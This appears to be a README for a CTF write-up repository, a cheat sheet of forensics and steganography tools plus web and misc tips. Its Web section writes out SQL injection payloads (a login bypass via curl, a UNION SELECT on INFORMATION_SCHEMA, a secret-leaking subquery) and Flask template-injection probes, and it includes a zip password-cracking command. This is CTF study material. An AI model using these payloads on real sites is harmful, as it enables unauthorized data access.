# CTF tools & Resources
This Repo Contains Write-UPs for all Tasks 
HERE ARE SOME EXTREMELY USEFUL TOOLS AND COMMANDS
### [Forensics, Linux Tools and Commands](#linux)
### [Web](#web)
### [Misc](#misc)

## <a name = "linux">Basic linux tools and Commands</a>
* binwalk -e <filenam> : //Extracts hidden files
* steghide extract -sf <filename> : //Extracts hidden text in the image
* xxd <file name> : //Prints the Hex version of file
* grep "element" //finds the element
* strings <filename> // gives the strings hidden in the file
* hexedit <filename> //hexeditor
* java -jar stegsolve.jar 
* pngcheck <filename> //checks if the png file is broken
* tar -xvf <filename> // untars the tar files
* cat temp.txt | cut -d'(' -f2 | sort -n | cut -d"'" -f2 | tr -d "\n" ; echo      
 // used this command to obtain the flag from the java file having flag characters written in an scrambled order 
* fcrackzip -u -l 10-11 -c a1 -p IEC2019000 findME.zip     
// this command helps us to find the password to a zip. -u : unzip -l: range of length -c: type of elements a1 means alphabets and numbers -p:sample password 
* ltrace ./file     is a helphul command to see the functioning of a program
also use strace
* cat /proc/(process id)/             
we can see all files running in the process with given process id.
* exiftool for meta data
* use tcpflow -r file  for pcap
* zsteg :- another great stego tool
* john the ripper :- tool for password cracking

## <a name = "web">Web</a>
### SQL injections
* curl "url" --data "username=admin&password='+or+1=1--" && echo 
this command will find the information to username admin stored in database (SQL injection).
* try admin'-- for SQLi.
* '||( SELECT secret FROM user WHERE username = 'a' )||'
* 1 union select 1,TABLE_NAME, 3,4 from INFORMATION_SCHEMA.TABLES     input this code in the info bar of a website for sql attack using injection.
* Basic Injection  if there is a hidden info in the data base then to leak the data type 'OR''=' in the info bar.
----------------------------------------------------------------------------------------------------------------------------------------------------------------
*  Postman great tool for web challs
* Robots -->>> url/robots.txt (shows hidden info)
* If a website uses flask, then try using {{ 7*7 }}to see its working, then use {{ config }}, {{request}},{{session}}, {{g}} in the text fields.
* To post requests to php from terminal use curl -X POST "url"

## <a name = "misc">Misc</a>
* Esoteric languages(pikalang, 2dfuck, brainfuck) use tio.run website, Malboge an esoteric language that looks like base 85.
*  git show -1 filename.txt > to compare against the last revision of file
   git show -2 filename.txt > to compare against the 2nd last revision of file
* Use this site for substitution https://quipqiup.com/
* Detect the DMFT Tools http://dialabc.com/sound/detect/index.html
* Online Stegnographic Decoder :- https://futureboy.us/stegano/decinput.html

